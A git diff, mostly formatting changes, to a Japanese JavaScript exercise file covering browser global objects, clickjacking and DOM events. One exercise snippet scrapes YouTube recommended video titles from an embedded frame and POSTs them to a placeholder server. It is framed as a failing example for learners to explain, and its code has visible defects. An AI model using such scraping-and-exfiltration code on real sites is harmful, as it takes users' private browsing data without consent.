@@ -9,7 +9,7 @@
 このアプリケーションを利用すると以下のような HTML ドキュメントがブラウザに表示されることが期待されます。
 
 ```html
-<!DOCTYPE html>
+<!doctype html>
 <html lang="ja">
   <head>
     <title>Simple ToDo</title>
@@ -70,7 +70,6 @@
 また、ブラウザとnodeのグローバルオブジェクトのプロパティやメソッドを比較し、ブラウザ独自のものを10程度記しなさい。<br>
 最後に、グローバルオブジェクトにundefinedが定義されていることを確認し、過去のES仕様でどのような問題が発生していたかを記しなさい。
 
-
 **出題範囲 15.1.3**
 
 ## 問題 15.1-3.5 💻
@@ -105,14 +104,17 @@ navigator から取得できる要素をページ中に描画して詐欺サイ�
 <script src="./script.js"></script>
 ...
 ```
+
 ```js
-(async () => {
+async () => {
   // YouTube が利用者に推薦する動画タイトルを取得すれば、利用者に最適な商品セットを表示できるのではないか？
-  const titles = document.getElementById("").contentWindowquerySelectorAll('#video-title');
+  const titles = document
+    .getElementById("")
+    .contentWindowquerySelectorAll("#video-title");
   for (const t of titles) {
-    await fetch("your-server-path", { method: "POST", body: t.textContent })
+    await fetch("your-server-path", { method: "POST", body: t.textContent });
   }
-});
+};
 ```
 
 しかし、トップページを読み込むとエラーになります。用語「クリックジャッキング」を調べて理由を説明しなさい。<br>
@@ -153,7 +155,6 @@ div 要素とテキスト input 要素が以下のようにイベント処理さ
 更にscript中のコメント1.～4.の指示に従いカスタムイベントの関連コードを完成させなさい。<br>
 最後にブラウザのデバッグツール(Chromeの場合はDeveloper ToolのEvent Listners)で、btn等に登録されているイベントをそれぞれ確認しなさい。
 
-
 ```html
 <!doctype html>
 <html lang="en">
@@ -169,7 +170,7 @@ div 要素とテキスト input 要素が以下のようにイベント処理さ
         () => {
           console.log("div");
         },
-        { capture: true },
+        { capture: true }
       );
       btn.addEventListener("click", () => {
         console.log("button");
@@ -199,7 +200,6 @@ div 要素とテキスト input 要素が以下のようにイベント処理さ
       // 3. ボタンにイベントリスナを追加し、ボタン押下するごとに乱数値を変更しなさい。変更にはRandomEventTargetのtriggerメソッドを利用しなさい。
 
       // 4. RandomEventTargetのtriggerメソッドによってイベントを発生させて、ページ読み込み時に乱数値を表示しなさい。
-
     </script>
   </head>
   <body>
@@ -208,9 +208,7 @@ div 要素とテキスト input 要素が以下のようにイベント処理さ
     </div>
   </body>
 </html>
-
 ```
-
 
 **出題範囲 15.2.1/15.2.4**
 
